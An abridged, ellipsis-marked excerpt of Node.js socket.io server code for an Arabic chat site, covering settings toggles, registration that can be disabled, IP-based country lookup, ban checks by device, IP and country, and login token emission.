                if (data.data["hidesoundnot"] == false || data.data["hidesoundnot"] == true) {} else {
                    return;
                }
                if (UserInfo[socket.id]) {

                    if (data.data["hidesoundnot"] == true) {
                        ChangeNosound(1);
                        setTimeout(function() {
                            if (UserInfo[socket.id]) {
                                UserInfo[socket.id].hidesoundnot = true;
                            };
                        }, 1000);
                    } else {
                        UserInfo[socket.id].hidesoundnot = false;
                        ChangeNosound(0);
                    }
                }
                ...
                if (data.data["alerts"] == false || data.data["alerts"] == true) {} else {
                    return;
                }
                if (UserInfo[socket.id]) {
                ...
                if (!SiteSetting["allowreg"]) {
                    ...
                    socket.emit("msg", {
                        ...
                        data: {
                            topic: "",
                            force: 1,
                            msg: "تم تعطيل تسجيل العضويات مؤقتآ .. حاول لاحقآ",
                            user: "",
                        },
                    });
                    removeip();
                ...
                request("https://ipinfo.io/" + MyIp() + "/json", function(err, rep, mycountry) {
                    if (mycountry) {
                        if (mycountry) {
                        ...
                        if (BandComplier(myserails)) {
                            ...
                            savelogin({
                                ...
                                topic: data.data["username"].slice(0, 20),
                                topic1: data.data["username"].slice(0, 20),
                                ip: MyIp(),
                            ...
                            if (res) {
                                ...
                                UsersRepo.create({
                                    ...
                                    if (res) {
                                        ...
                                        removeip();
                                        setTimeout(function() {
                                            socket.emit("msg", { cmd: "login", data: { id: socket.id, msg: "reg", ttoken: stringGen(177), pic: "pic.png" } });
                                            RefreshUsers();
                                        }, 1000);
                                    };
                                });
         ...
         socket.emit("msg", { cmd: "removede", data: {} });
                    ...
                    return;				
                                            ...
                                            socket.emit("msg", { cmd: "login", data: { uid: login.uid, point: login.evaluation, id: socket.id, room: MyRoom(myserails), msg: "ok", ttoken: login.token, pic: login.pic } });
                        ...
                        BandRepo.getByDIp({ device_band: myserails, ip_band: MyIp(), country_band: mycountry["country"] }).then((band) => {
                            if (band) {
                                ...
                                if (SystemOpen.system1 == true && (!!~myserail.plt.toLowerCase().indexOf("win") || !!~myserail.plt.toLowerCase().indexOf("windows"))) {
                                    ...
                                    socket.emit("msg", { cmd: "login", data: { uid: "", id: socket.id, room: MyRoom(myserails), msg: "ok", ttoken: mytoken, pic: "pic.png" } });
                                    // IsGust(myserails);
